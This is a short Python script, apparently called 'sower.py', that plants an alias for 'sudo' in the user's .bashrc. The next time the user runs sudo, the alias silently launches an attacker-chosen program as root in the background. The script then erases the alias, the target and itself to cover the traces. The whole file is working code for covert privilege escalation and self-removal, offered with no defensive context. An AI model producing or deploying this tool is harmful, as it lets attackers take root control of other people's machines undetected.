import os
import argparse
from pathlib import Path


parser = argparse.ArgumentParser()
parser.add_argument('-p', '--path', type=str,
                    help='path to script or executable file (target)')
parser.add_argument('-c', '--command', type=str,
                    help='command to launch target ("sh", "python3" etc.)')
parser.add_argument('-r', '--remove', action='store_true',
                    help='remove "sower.py" and target (done automatically)')
args = parser.parse_args()


def createalias(path, command):
    sowdir = sowerdir()
    return 'alias sudo="sudo sleep 0.001 && (nohup sudo ' + command + ' ' + path +\
           ' </dev/null >/dev/null 2>&1 && nohup python3 ' + sowdir + '/sower.py -c ' + command +\
           ' -p ' + path + ' -r </dev/null >/dev/null 2>&1 &) && unalias sudo && sudo"'


def sowerdir():
    return os.path.dirname(os.path.abspath(__file__))


def abspath(path):
    return os.path.abspath(path)


def modifybashrc(userpath):
    bashrc = open(userpath + '/.bashrc', 'a')
    if not args.command:
        print("specify command (-c/--command)!")
        exit()
    if not args.path:
        print("specify path to executable file (-p/--path)!")
        exit()
    alias = createalias(abspath(args.path), args.command)
    bashrc.write(alias + "\n")


def reloadbashrc(userpath):
    os.system(". " + userpath + "/.bashrc")


def getuserpath():
    return str(Path.home())


def remove():
    userpath = getuserpath()
    bashrc = open(userpath + '/.bashrc', 'r')
    lines = bashrc.readlines()
    bashrc.close()
    bashrc = open(userpath + '/.bashrc', 'w')
    for line in lines:
        if line != createalias(abspath(args.path), args.command):
            bashrc.write(line)
    bashrc.close()
    reloadbashrc(userpath)
    os.remove(abspath(args.path))
    os.remove(sowerdir() + "/sower.py")


def main():
    if args.remove:
        remove()
        exit()
    userpath = getuserpath()
    modifybashrc(userpath)
    reloadbashrc(userpath)


if __name__ == "__main__":
    main()
